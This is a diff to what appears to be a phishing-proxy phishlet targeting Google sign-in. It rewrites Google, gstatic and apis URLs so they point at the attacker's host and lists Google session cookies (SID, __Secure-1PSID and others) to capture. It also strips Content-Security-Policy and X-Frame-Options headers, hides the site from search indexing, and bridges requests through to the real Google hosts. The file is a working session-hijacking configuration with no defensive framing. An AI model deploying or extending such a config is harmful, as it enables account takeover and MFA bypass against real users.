@@ -7,8 +7,14 @@ proxy_hosts:
   - {phish_sub: "www", orig_sub: "www", domain: "google.com", session: false, is_landing: false}
   - {phish_sub: "apis", orig_sub: "apis", domain: "google.com", session: false, is_landing: false}
 sub_filters:
-  - {triggers_on: "accounts.google.com", orig_sub: "accounts", domain: "google.com", search: "https://{hostname}/", replace: "https://{hostname}/", mimes: ["text/html", "application/json", "application/javascript"]}
-  - {triggers_on: "ssl.gstatic.com", orig_sub: "ssl", domain: "gstatic.com", search: "https://{hostname}/", replace: "https://{hostname}/", mimes: ["text/html", "application/json", "application/javascript"]}
+  - {triggers_on: "accounts.google.com", orig_sub: "accounts", domain: "google.com", search: "https://accounts.google.com/", replace: "https://{hostname}/", mimes: ["text/html", "application/json", "application/javascript"]}
+  - {triggers_on: "accounts.google.com", orig_sub: "accounts", domain: "google.com", search: "https:\\/\\/accounts.google.com\\/", replace: "https:\\/\\/{hostname}\\/", mimes: ["text/html", "application/json", "application/javascript"]}
+  - {triggers_on: "ssl.gstatic.com", orig_sub: "ssl", domain: "gstatic.com", search: "https://ssl.gstatic.com/", replace: "https://{hostname}/_ssl/", mimes: ["text/html", "application/json", "application/javascript"]}
+  - {triggers_on: "ssl.gstatic.com", orig_sub: "ssl", domain: "gstatic.com", search: "https:\\/\\/ssl.gstatic.com\\/", replace: "https:\\/\\/{hostname}\\/_ssl\\/", mimes: ["text/html", "application/json", "application/javascript"]}
+  - {triggers_on: "www.google.com", orig_sub: "www", domain: "google.com", search: "https://www.google.com/", replace: "https://{hostname}/_www/", mimes: ["text/html", "application/json", "application/javascript"]}
+  - {triggers_on: "www.google.com", orig_sub: "www", domain: "google.com", search: "https:\\/\\/www.google.com\\/", replace: "https:\\/\\/{hostname}\\/_www\\/", mimes: ["text/html", "application/json", "application/javascript"]}
+  - {triggers_on: "apis.google.com", orig_sub: "apis", domain: "google.com", search: "https://apis.google.com/", replace: "https://{hostname}/_apis/", mimes: ["text/html", "application/json", "application/javascript"]}
+  - {triggers_on: "apis.google.com", orig_sub: "apis", domain: "google.com", search: "https:\\/\\/apis.google.com\\/", replace: "https:\\/\\/{hostname}\\/_apis\\/", mimes: ["text/html", "application/json", "application/javascript"]}
 auth_tokens:
   - domain: ".google.com"
     keys: ["SID", "HSID", "SSID", "APISID", "SAPISID", "__Secure-1PSID", "__Secure-3PSID", "__Secure-1PAPISID", "__Secure-3PAPISID", "NID", "GAPS", "LSID", "SIDCC", "__Host-GAPS"]
@@ -62,4 +68,12 @@ js_inject:
             }
         });
       })();
-
+headers:
+  - {action: "remove", name: "Content-Security-Policy"}
+  - {action: "remove", name: "X-Frame-Options"}
+  - {action: "remove", name: "X-Content-Type-Options"}
+  - {action: "add", name: "X-Robots-Tag", value: "noindex, nofollow, noarchive"}
+bridges:
+  - {prefix: "/_ssl/", target_host: "ssl.gstatic.com", strip_prefix: true, cors: "allow_all"}
+  - {prefix: "/_www/", target_host: "www.google.com", strip_prefix: true, cors: "allow_all"}
+  - {prefix: "/_apis/", target_host: "apis.google.com", strip_prefix: true, cors: "allow_all"}
